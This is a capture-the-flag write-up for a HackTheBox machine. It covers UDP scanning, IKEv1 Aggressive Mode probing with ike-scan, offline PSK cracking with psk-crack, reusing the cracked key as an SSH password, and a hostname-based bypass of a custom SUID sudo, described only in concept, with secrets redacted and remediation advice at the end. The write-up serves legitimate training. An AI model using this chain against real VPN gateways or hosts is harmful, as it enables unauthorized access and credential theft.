
Target: expressway.htb 
Platform: HackTheBox (CTF) — private/retired machine assumptions: yes
Difficulty: Easy / Beginner
Goal: Capture user.txt and root.txt (both redacted here)

TL;DR (one sentence)

TCP scan only showed SSH; a UDP sweep revealed an IKEv1 endpoint that leaked identity/PSK material in Aggressive Mode, the PSK was cracked offline and reused as an SSH password to get user; local enumeration revealed a custom SUID sudo and readable proxy logs pointing to an internal hostname that allowed a hostname‑based policy bypass to get root.

Prerequisites / Tools

nmap, rustscan (optional), ike-scan, psk-crack (part of ike-scan), tcpdump, gobuster, ssh, basic Linux tooling.

Wordlists: rockyou.txt or other large wordlists (decompress before use).

A private environment / HTB VPN — do not run these scans on unauthorized systems.

1 — Recon (TCP & UDP)

Quick TCP discovery

# fast, all TCP ports (or rustscan → nmap combo)
sudo nmap -sS -p- -T4 <IP> -oN nmap_full_tcp.txt


Result (sanitized): 22/tcp open ssh — nothing else on TCP.

UDP discovery (look for non‑TCP services)

sudo nmap -sU --top-ports 200 -T3 <IP> -oN nmap_udp_top200.txt
# or a full UDP scan if you prefer (slow)
sudo nmap -sU -p- <IP> -T3 --max-retries 3 -oN nmap_udp_full.txt


Result (sanitized): 500/udp open isakmp (IKE) — promising; many other UDP ports were open|filtered.

2 — IKE fingerprinting & information leak (Aggressive Mode)

Use ike-scan to fingerprint the IKE endpoint and try Aggressive Mode:

# basic probe
sudo ike-scan <IP>

# aggressive mode (elicit identity / PSK-related data)
sudo ike-scan -A <IP>


Typical useful output (sanitized):

SA proposals include Auth=PSK (tells you the gateway uses pre‑shared keys).

ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) — leaked identity string.

Vendor IDs (helpful for fingerprinting the vendor/implementation).

Force a consistent ID and save PSK parameters for offline cracking:

sudo ike-scan -A --id=ike@expressway.htb -P ike.psk expressway.htb
# This writes parameters for offline cracking into ike.psk


What -P ike.psk does: it saves the Aggressive‑Mode handshake parameters (the data used to verify PSKs offline) into a file named ike.psk. This file is used for offline cracking only.

Important: ike.psk contains hash/material that can be cracked offline. Keep it local and treat it as sensitive — do not publish raw items from it.

3 — Offline PSK cracking (dictionary attack)

Ensure you have a wordlist available (e.g., rockyou.txt decompressed). If rockyou.txt.gz is present, decompress it first:

# if needed
zcat /usr/share/wordlists/rockyou.txt.gz > /dev/shm/rockyou.txt


Run psk-crack in dictionary mode:

psk-crack -d /dev/shm/rockyou.txt ike.psk


Output will either show a match (recovered PSK) or “no match found”.

In this CTF the PSK was recovered from the wordlist (redacted here as <recovered-psk-redacted>).

Note: If psk-crack returns no match, try larger or targeted wordlists (Seclists, custom wordlists from target words, cewl output, etc.).

4 — Initial access (SSH using recovered credential)

Attempt SSH using the recovered identity as username and the recovered PSK as password (in CTF context only). Example:

ssh ike@expressway.htb
# password: <recovered-psk-redacted>


On success you get a shell as the ike user.

Confirm your user and groups with:

id
groups


Sanitized result example: uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)

Note: This pivot (PSK reused as a user password) is a CTF/real‑world misconfiguration — always treat such credentials carefully.

5 — Post‑access enumeration (user shell)

From the user shell, perform standard enumeration:

Check home directory, readable files:

ls -la ~
cat ~/user.txt   # DO NOT publish the flag — redact it in writeups


System info and kernel:

uname -a
cat /etc/os-release


Find SUID binaries and interesting files:

find / -perm -4000 -type f 2>/dev/null | sort
which sudo
ls -l /usr/local/bin/sudo   # discover custom sudo binary (if present)


Check group membership for hints (e.g., proxy group) and permissions:

groups
getent group proxy
ls -l /var/log/squid


Read any logs you can (respecting redaction) — in this CTF a Squid access log was readable by the proxy group:

cat /var/log/squid/access.log.1 | sed -n '1,200p'   # redact anything sensitive


From the logs you might find an internal hostname such as offramp.expressway.htb (used later to bypass policy).

6 — Privilege escalation (conceptual, sanitized)

What we found:

A custom sudo binary existed at /usr/local/bin/sudo (SUID root) instead of the standard /usr/bin/sudo.

The custom binary implemented a hostname‑based policy (i.e., it allowed or denied execution based on the hostname supplied).

Squid logs revealed an internal host name (offramp.expressway.htb) that the policy treated differently.

Exploit concept (CTF‑only):
Because the custom sudo accepted a -h <hostname> argument to specify the host context, invoking the binary with the internal hostname made it consider you as executing from that host and allowed escalation. In the CTF the operator ran the custom sudo with the internal hostname and spawned a root shell. (Redacted: do not run such commands against unauthorized systems.)

Sanitized demonstration command (for documentation):

# Conceptual only — this illustrates the approach, not a general exploit:
Invoke the custom sudo, specifying the internal host name discovered in logs, causing it to grant root execution privileges.


After the bypass, verify root:

id    # shows uid=0(root)
cat /root/root.txt  # redact the flag before publishing

7 — Artifacts (what to store in your repo)

nmap output files (sanitized).

ike-scan sanitized output lines (do not include full ike.psk hash material in public). Example: redact the long hash and show only that ike-scan -P produced a file.

commands.txt — list of commands you ran (no secrets, redact PSK/flags).

Screenshots of key tool outputs with flags/PSKs blurred.

A short timeline of steps taken and lessons learned.

8 — Remediation & Lessons Learned (concise)

Disable IKEv1 Aggressive Mode and prefer IKEv2 + certificate authentication on VPN gateways. Aggressive Mode leaks identity/PSK‑related material.

Use strong, unique PSKs (if PSK necessary) and never reuse keys as login passwords. Use long random secrets or move to cert-based auth.

Don’t replace core security binaries (like sudo) with unvetted custom SUID programs; use /etc/sudoers and tested mechanisms for privilege delegation.

Restrict log permissions and treat logs as sensitive — readable logs can leak internal hostnames and other intel.

Inventory & monitoring: Log and monitor IKE/UDP 500/4500 traffic and unusual auth attempts.

9 — Writeup publishing checklist (safe / private → public)

Private repo while machine is live. If publishing later: ensure the machine is retired and you have sanitized everything.

Remove or redact all flags, recovered passwords, PSKs, and raw ike.psk contents. Replace with placeholders like <user-flag> or <recovered-psk-redacted>.

Do not publish exploit code or payloads that target unpatched, real systems.

Example sanitized commands.txt (to include in your repo)
# Recon
sudo nmap -sS -p- -T4 <IP> -oN nmap_full_tcp.txt
sudo nmap -sU --top-ports 200 -T3 <IP> -oN nmap_udp_top200.txt

# IKE fingerprinting & dump
sudo ike-scan -A <IP>
sudo ike-scan -A --id=ike@expressway.htb -P ike.psk expressway.htb

# Offline cracking (local, CTF only)
psk-crack -d /path/to/wordlist.txt ike.psk

# SSH
ssh ike@expressway.htb   # password: <recovered-psk-redacted>

# Post-exploitation enumeration
id
groups
find / -perm -4000 -type f 2>/dev/null | sort
ls -l /usr/local/bin/sudo
ls -l /var/log/squid
cat /var/log/squid/access.log.1  # redact sensitive lines
